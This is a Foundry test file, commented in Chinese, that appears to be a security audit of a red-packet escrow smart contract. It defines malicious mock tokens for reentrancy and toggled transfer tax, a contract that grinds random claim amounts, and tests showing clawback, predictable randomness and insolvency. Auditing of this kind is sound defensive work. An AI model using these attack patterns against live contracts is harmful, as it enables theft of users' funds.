// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// 审计概念验证：攻击者视角。每个测试名前缀说明结论：
//   poc_   = 证实了的问题（测试通过 = 攻击成功 / 问题存在）
//   safe_  = 尝试的攻击失败（测试通过 = 合约挡住了）

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {TapeTapeRedPacket} from "../../src/TapeTapeRedPacket.sol";

contract AToken is ERC20 {
    constructor() ERC20("A", "A") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

/// USDT（以太坊版）风格：transfer/transferFrom 无返回值。
contract NoReturnToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }

    function approve(address s, uint256 a) external {
        allowance[msg.sender][s] = a;
    }

    function transfer(address to, uint256 a) external {
        require(balanceOf[msg.sender] >= a);
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
    }

    function transferFrom(address f, address to, uint256 a) external {
        require(allowance[f][msg.sender] >= a && balanceOf[f] >= a);
        allowance[f][msg.sender] -= a;
        balanceOf[f] -= a;
        balanceOf[to] += a;
    }
}

/// USDC / USDT 风格：发行方可拉黑地址、可全局暂停。
contract BlacklistToken is ERC20 {
    mapping(address => bool) public black;
    bool public paused;

    constructor() ERC20("B", "B") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function setBlack(address a, bool b) external {
        black[a] = b;
    }

    function setPaused(bool p) external {
        paused = p;
    }

    function _update(address from, address to, uint256 v) internal override {
        require(!paused, "paused");
        require(!black[from] && !black[to], "blacklisted");
        super._update(from, to, v);
    }
}

/// 入账时无税、创建后由代币管理员打开「转出税」——绕过创建时的到账检查。
contract ToggleTaxToken is ERC20 {
    bool public tax;

    constructor() ERC20("X", "X") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function setTax(bool t) external {
        tax = t;
    }

    function _update(address from, address to, uint256 v) internal override {
        if (tax && from != address(0) && to != address(0)) {
            super._update(from, address(0), v / 10);
            v -= v / 10;
        }
        super._update(from, to, v);
    }
}

/// 恶意代币：在转账回调里尝试重入红包合约的各个入口。
/// 打开后从「付款方」额外扣税（收款方足额）：合约余额减少多于记账。
contract SenderTaxToken is ERC20 {
    bool public tax;

    constructor() ERC20("S", "S") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function setTax(bool t) external {
        tax = t;
    }

    function _update(address from, address to, uint256 v) internal override {
        if (tax && from != address(0) && to != address(0)) super._update(from, address(0), v / 10);
        super._update(from, to, v);
    }
}

contract ReentrantToken is ERC20 {
    TapeTapeRedPacket public rp;
    bytes public payload;
    bool public reentered;
    bool public attempted;

    constructor() ERC20("R", "R") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function arm(TapeTapeRedPacket r, bytes calldata p) external {
        rp = r;
        payload = p;
    }

    function _update(address from, address to, uint256 v) internal override {
        super._update(from, to, v);
        if (address(rp) != address(0) && !attempted && payload.length != 0) {
            attempted = true;
            (bool ok,) = address(rp).call(payload);
            reentered = ok;
        }
    }
}

/// 用合约领取并检查金额，不满意就整笔回滚——「挑金额」攻击。
contract Grinder {
    function tryClaim(TapeTapeRedPacket rp, address creator, string calldata id, bytes calldata sig, uint256 minWanted)
        external
        returns (uint256 got)
    {
        got = rp.claimRedPacket(creator, id, sig);
        require(got >= minWanted, "too small, roll back");
    }
}

contract RedPacketAuditTest is Test {
    TapeTapeRedPacket rp;
    AToken tok;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice"); // 创建者
    address bob = makeAddr("bob"); // 领取人
    address mallory = makeAddr("mallory"); // 攻击者（无领取密钥）
    uint256 keyPk = 0xBEEF;
    address claimKey;

    function setUp() public {
        rp = new TapeTapeRedPacket(owner, 10);
        tok = new AToken();
        claimKey = vm.addr(keyPk);
        tok.mint(alice, 1e30);
        vm.deal(alice, 1e30);
        vm.prank(alice);
        tok.approve(address(rp), type(uint256).max);
    }

    function _sign(TapeTapeRedPacket r, uint256 pk, address creator, string memory id, address claimer)
        internal
        view
        returns (bytes memory)
    {
        bytes32 d = MessageHashUtils.toEthSignedMessageHash(r.claimDigest(creator, id, claimer));
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(pk, d);
        return abi.encodePacked(rr, s, v);
    }

    function _create(string memory id, address token, uint256 amount, uint256 count) internal {
        vm.prank(alice);
        if (token == address(0)) rp.createRedPacket{value: amount}(id, token, amount, count, claimKey, address(0), 50);
        else rp.createRedPacket(id, token, amount, count, claimKey, address(0), 50);
    }

    // ---------------------------------------------------------------------------------------------
    // 1:1 转账：创建者自己也持有领取密钥，可以在对方领取前（甚至抢跑对方的领取交易）把钱领回。

    function test_poc_transferSenderClawsBackBeforeRecipient() public {
        _create("pay-bob", address(tok), 1000e18, 1);
        // 链上看起来「alice 给 bob 转了 1000」，bob 的客户端可能已显示「收到」。
        // alice 用自己的另一个钱包（或本人）领走——合约无法区分。
        address aliceAlt = makeAddr("aliceAlt");
        bytes memory s = _sign(rp, keyPk, alice, "pay-bob", aliceAlt);
        vm.prank(aliceAlt);
        rp.claimRedPacket(alice, "pay-bob", s);
        // bob 再来领：份额已空。
        bytes memory sb = _sign(rp, keyPk, alice, "pay-bob", bob);
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.NoSharesLeft.selector);
        rp.claimRedPacket(alice, "pay-bob", sb);
        assertEq(tok.balanceOf(aliceAlt), 990e18); // 扣 1% 手续费后全部回到 alice 手里
    }

    // ---------------------------------------------------------------------------------------------
    // 挑金额：领取人用合约领取，金额不满意就回滚，下一个区块再试。回滚不留任何状态。

    function test_poc_claimerCanGrindForLargeShare() public {
        _create("grind", address(tok), 1000e18, 10); // 净额 990，平均 99，最多 198
        Grinder g = new Grinder();
        bytes memory s = _sign(rp, keyPk, alice, "grind", address(g));
        uint256 got;
        uint256 tries;
        for (uint256 i = 0; i < 200; i++) {
            vm.warp(block.timestamp + 3);
            vm.prevrandao(bytes32(uint256(keccak256(abi.encode(i)))));
            try g.tryClaim(rp, alice, "grind", s, 180e18) returns (uint256 a) {
                got = a;
                tries = i + 1;
                break;
            } catch {}
        }
        assertGe(got, 180e18); // 拿到平均值约 1.8 倍以上
        emit log_named_uint("tries", tries);
        // 而且根本不用回滚：随机数输入在交易前都可知，链下就能算出这一块领多少。
    }

    function test_poc_amountPredictableOffChain() public {
        _create("pred", address(tok), 1000e18, 10);
        bytes32 key = rp.packetKey(alice, "pred");
        uint256 remainAmount = 990e18;
        uint256 remainCount = 10;
        uint256 rand = uint256(keccak256(abi.encode(block.timestamp, block.prevrandao, bob, remainCount, key)));
        uint256 predicted = 1 + (rand % ((remainAmount * 2) / remainCount));
        bytes memory s = _sign(rp, keyPk, alice, "pred", bob);
        vm.prank(bob);
        assertEq(rp.claimRedPacket(alice, "pred", s), predicted);
    }

    // ---------------------------------------------------------------------------------------------
    // 签名重放

    function test_safe_replayAcrossClaimers() public {
        _create("r1", address(tok), 100e18, 5);
        bytes memory s = _sign(rp, keyPk, alice, "r1", bob);
        vm.prank(bob);
        rp.claimRedPacket(alice, "r1", s);
        vm.prank(mallory);
        vm.expectRevert(TapeTapeRedPacket.InvalidSignature.selector);
        rp.claimRedPacket(alice, "r1", s);
    }

    function test_safe_replayAcrossPacketsWithSameClaimKey() public {
        // 即便客户端 bug 让两个红包用了同一把领取密钥，签名也不能跨红包用。
        _create("k1", address(tok), 100e18, 5);
        _create("k2", address(tok), 100e18, 5);
        bytes memory s = _sign(rp, keyPk, alice, "k1", bob);
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.InvalidSignature.selector);
        rp.claimRedPacket(alice, "k2", s);
    }

    function test_safe_replayAcrossChains() public {
        _create("c1", address(tok), 100e18, 5);
        bytes memory s56 = _sign(rp, keyPk, alice, "c1", bob);
        vm.chainId(196);
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.InvalidSignature.selector);
        rp.claimRedPacket(alice, "c1", s56);
    }

    function test_safe_replayAcrossContracts() public {
        TapeTapeRedPacket rp2 = new TapeTapeRedPacket(owner, 10);
        _create("x1", address(tok), 100e18, 5);
        vm.startPrank(alice);
        tok.approve(address(rp2), type(uint256).max);
        rp2.createRedPacket("x1", address(tok), 100e18, 5, claimKey, address(0), 50);
        vm.stopPrank();
        bytes memory s = _sign(rp, keyPk, alice, "x1", bob);
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.InvalidSignature.selector);
        rp2.claimRedPacket(alice, "x1", s);
    }

    function test_safe_malleableSignatureRejected() public {
        _create("m1", address(tok), 100e18, 5);
        bytes32 d = MessageHashUtils.toEthSignedMessageHash(rp.claimDigest(alice, "m1", bob));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(keyPk, d);
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes memory flipped = abi.encodePacked(r, bytes32(n - uint256(s)), v == 27 ? uint8(28) : uint8(27));
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.InvalidSignature.selector);
        rp.claimRedPacket(alice, "m1", flipped);
    }

    function test_safe_otherCreatorCannotHijackKeyOrId() public {
        // mallory 抢跑 alice 的创建交易，用同一个 id 和同一个领取密钥地址——落在不同的存储键上。
        tok.mint(mallory, 1e18);
        vm.startPrank(mallory);
        tok.approve(address(rp), type(uint256).max);
        rp.createRedPacket("same", address(tok), 1e18, 1, claimKey, address(0), 50);
        vm.stopPrank();
        _create("same", address(tok), 100e18, 5); // alice 的创建不受影响
        assertEq(rp.getRedPacketInfo(alice, "same").totalAmount, 99e18);
    }

    // ---------------------------------------------------------------------------------------------
    // 重入（恶意代币在回调里调用各入口）

    function test_safe_reentrancyFromTokenCallback() public {
        ReentrantToken rt = new ReentrantToken();
        rt.mint(alice, 1e30);
        vm.prank(alice);
        rt.approve(address(rp), type(uint256).max);
        _create("re", address(rt), 100e18, 5);
        bytes memory s = _sign(rp, keyPk, alice, "re", bob);
        // 领取时代币回调里再调一次 claim / refund / create
        rt.arm(rp, abi.encodeCall(rp.claimRedPacket, (alice, "re", s)));
        vm.prank(bob);
        rp.claimRedPacket(alice, "re", s);
        assertTrue(rt.attempted());
        assertFalse(rt.reentered());
    }

    // ---------------------------------------------------------------------------------------------
    // ERC-20 怪异行为

    function test_safe_noReturnValueToken() public {
        NoReturnToken nr = new NoReturnToken();
        nr.mint(alice, 1000);
        vm.prank(alice);
        nr.approve(address(rp), 1000);
        _create("nr", address(nr), 1000, 2);
        bytes memory s = _sign(rp, keyPk, alice, "nr", bob);
        vm.prank(bob);
        uint256 a = rp.claimRedPacket(alice, "nr", s);
        assertEq(nr.balanceOf(bob), a);
    }

    function test_safe_blacklistedClaimerDoesNotBlockOthers() public {
        BlacklistToken bt = new BlacklistToken();
        bt.mint(alice, 1e30);
        vm.prank(alice);
        bt.approve(address(rp), type(uint256).max);
        _create("bl", address(bt), 100e18, 2);
        bt.setBlack(bob, true);
        bytes memory s = _sign(rp, keyPk, alice, "bl", bob);
        vm.prank(bob);
        vm.expectRevert();
        rp.claimRedPacket(alice, "bl", s);
        // 其他人照常领，份额没被占
        bytes memory sm = _sign(rp, keyPk, alice, "bl", mallory);
        vm.prank(mallory);
        rp.claimRedPacket(alice, "bl", sm);
        assertEq(rp.getRedPacketInfo(alice, "bl").remainCount, 1);
    }

    function test_poc_blacklistedCreatorCannotRefund_fundsStuck() public {
        BlacklistToken bt = new BlacklistToken();
        bt.mint(alice, 1e30);
        vm.prank(alice);
        bt.approve(address(rp), type(uint256).max);
        _create("blc", address(bt), 100e18, 3);
        bt.setBlack(alice, true);
        vm.warp(block.timestamp + 7 days);
        vm.prank(alice);
        vm.expectRevert();
        rp.refundRedPacket("blc", alice); // 退款没有「退到别的地址」的选项
        // 但领取仍可进行（不会全卡死）
        bytes memory s = _sign(rp, keyPk, alice, "blc", bob);
        vm.prank(bob);
        rp.claimRedPacket(alice, "blc", s);
    }

    function test_safe_pausedTokenIsTemporary() public {
        BlacklistToken bt = new BlacklistToken();
        bt.mint(alice, 1e30);
        vm.prank(alice);
        bt.approve(address(rp), type(uint256).max);
        _create("ps", address(bt), 100e18, 2);
        bt.setPaused(true);
        bytes memory s = _sign(rp, keyPk, alice, "ps", bob);
        vm.prank(bob);
        vm.expectRevert();
        rp.claimRedPacket(alice, "ps", s);
        bt.setPaused(false);
        vm.prank(bob);
        rp.claimRedPacket(alice, "ps", s);
    }

    /// 创建时不收税、创建后打开税：到账检查只在入账时做一次。
    /// 结果：同一代币的托管变得资不抵债，最后领 / 退的人拿不到（只影响该代币）。
    function test_poc_toggleableTaxToken_recipientShortchanged() public {
        ToggleTaxToken tt = new ToggleTaxToken();
        tt.mint(alice, 1e30);
        vm.prank(alice);
        tt.approve(address(rp), type(uint256).max);
        _create("t1", address(tt), 100e18, 1);
        _create("t2", address(tt), 100e18, 1);
        tt.setTax(true);
        // 本例税是从收款方扣，合约余额按记账减少——不会资不抵债，只是领取人少收 10%。
        bytes memory s = _sign(rp, keyPk, alice, "t1", bob);
        vm.prank(bob);
        rp.claimRedPacket(alice, "t1", s);
        assertEq(tt.balanceOf(bob), (99e18 * 9) / 10);
    }

    function test_poc_senderTaxToken_sameTokenInsolvent() public {
        SenderTaxToken st = new SenderTaxToken();
        st.mint(alice, 1e30);
        vm.prank(alice);
        st.approve(address(rp), type(uint256).max);
        _create("s1", address(st), 100e18, 1);
        _create("s2", address(st), 100e18, 1);
        st.setTax(true);
        bytes memory s = _sign(rp, keyPk, alice, "s1", bob);
        vm.prank(bob);
        rp.claimRedPacket(alice, "s1", s);
        // 记账还欠 s2 的 99 + 手续费 2，实际余额只剩 200 - 99 - 9.9
        assertLt(st.balanceOf(address(rp)), 99e18 + 2e18);
        bytes memory s2 = _sign(rp, keyPk, alice, "s2", mallory);
        vm.prank(mallory);
        vm.expectRevert(); // 第二个红包的领取人已经领不到了（余额 81.2 < 应付 99）
        rp.claimRedPacket(alice, "s2", s2);
    }

    // ---------------------------------------------------------------------------------------------
    // 主人权限

    function test_safe_ownerCannotTouchEscrow() public {
        _create("o1", address(tok), 1000e18, 5);
        _create("o2", address(0), 1000e18, 5);
        vm.startPrank(owner);
        rp.withdrawFees(address(tok), owner);
        rp.withdrawFees(address(0), owner);
        vm.expectRevert(TapeTapeRedPacket.NothingToWithdraw.selector);
        rp.withdrawFees(address(tok), owner);
        rp.setFeeRate(50);
        rp.setMinAmount(address(tok), type(uint256).max);
        vm.stopPrank();
        assertEq(tok.balanceOf(owner), 10e18);
        assertEq(owner.balance, 10e18);
        assertEq(tok.balanceOf(address(rp)), 990e18);
        assertEq(address(rp).balance, 990e18);
        // 已创建的红包不受改费率、改最小额影响
        bytes memory s = _sign(rp, keyPk, alice, "o1", bob);
        vm.prank(bob);
        rp.claimRedPacket(alice, "o1", s);
    }

    // 第一轮低危 5 已修：不能放弃主人。
    function test_fixed_renounceDisabled() public {
        _create("rf", address(tok), 1000e18, 5);
        vm.prank(owner);
        vm.expectRevert(TapeTapeRedPacket.RenounceDisabled.selector);
        rp.renounceOwnership();
        assertEq(rp.owner(), owner);
    }

    function test_poc_strayTokensSentDirectlyAreStuck() public {
        tok.mint(bob, 5e18);
        vm.prank(bob);
        tok.transfer(address(rp), 5e18); // 用户误转
        // 合约没有任何路径能动这 5 个
        assertEq(tok.balanceOf(address(rp)), 5e18);
        vm.prank(owner);
        vm.expectRevert(TapeTapeRedPacket.NothingToWithdraw.selector);
        rp.withdrawFees(address(tok), owner);
    }

    // ---------------------------------------------------------------------------------------------
    // 整数

    /// 净额 > 2^255 时 remainAmount*2 溢出，领取永远 revert；只可能出现在攻击者自己发的代币上，7 天后可退。
    // 第一轮建议 7 已修：先除后乘，极大金额也能正常领完。
    function test_fixed_hugeAmountClaims() public {
        AToken big = new AToken();
        big.mint(alice, type(uint256).max);
        vm.prank(alice);
        big.approve(address(rp), type(uint256).max);
        vm.prank(owner);
        rp.setFeeRate(0);
        vm.prank(alice);
        rp.createRedPacket("big", address(big), type(uint256).max, 2, claimKey, address(0), 50);
        bytes memory s = _sign(rp, keyPk, alice, "big", bob);
        vm.prank(bob);
        uint256 a = rp.claimRedPacket(alice, "big", s);
        address carol = makeAddr("carol");
        s = _sign(rp, keyPk, alice, "big", carol);
        vm.prank(carol);
        uint256 b = rp.claimRedPacket(alice, "big", s);
        assertEq(a + b, type(uint256).max);
    }

    /// 费率乘法溢出：amount * rate 在 amount > 2^256/50 时 panic——只是创建失败，无资金影响。
    function test_safe_refundBoundary() public {
        _create("rb", address(tok), 100e18, 2);
        vm.warp(block.timestamp + 7 days - 1);
        vm.prank(alice);
        vm.expectRevert(TapeTapeRedPacket.RefundTooEarly.selector);
        rp.refundRedPacket("rb", alice);
        vm.warp(block.timestamp + 1);
        vm.prank(alice);
        rp.refundRedPacket("rb", alice);
        bytes memory s = _sign(rp, keyPk, alice, "rb", bob);
        vm.prank(bob);
        vm.expectRevert(TapeTapeRedPacket.PacketRefunded.selector);
        rp.claimRedPacket(alice, "rb", s);
    }

    /// 1000 份全部领完后，getClaimRecords 的 eth_call 用多少 gas。
    function test_safe_claimRecordsGasAtMax() public {
        _create("max", address(tok), 1000e18, 1000);
        for (uint256 i = 1; i <= 1000; i++) {
            address c = address(uint160(0x100000 + i));
            bytes memory s = _sign(rp, keyPk, alice, "max", c);
            vm.prank(c);
            rp.claimRedPacket(alice, "max", s);
        }
        uint256 g = gasleft();
        rp.getClaimRecords(alice, "max");
        emit log_named_uint("getClaimRecords gas (1000 records)", g - gasleft());
        assertEq(tok.balanceOf(address(rp)), 10e18); // 只剩手续费
    }

    /// 任意字节的 id（含换行、零宽字符、RTL 覆盖）都能用——事件里的 id 是原样字符串。
    // 第一轮建议 8 已修：ID 只允许 [0-9A-Za-z-]。
    function test_fixed_idRejectsArbitraryBytes() public {
        string memory weird = string(abi.encodePacked(hex"e280ae", "gnp.exe\n", hex"e2808b"));
        vm.prank(alice);
        vm.expectRevert(TapeTapeRedPacket.InvalidId.selector);
        rp.createRedPacket(weird, address(tok), 100e18, 1, claimKey, address(0), 50);
    }
}
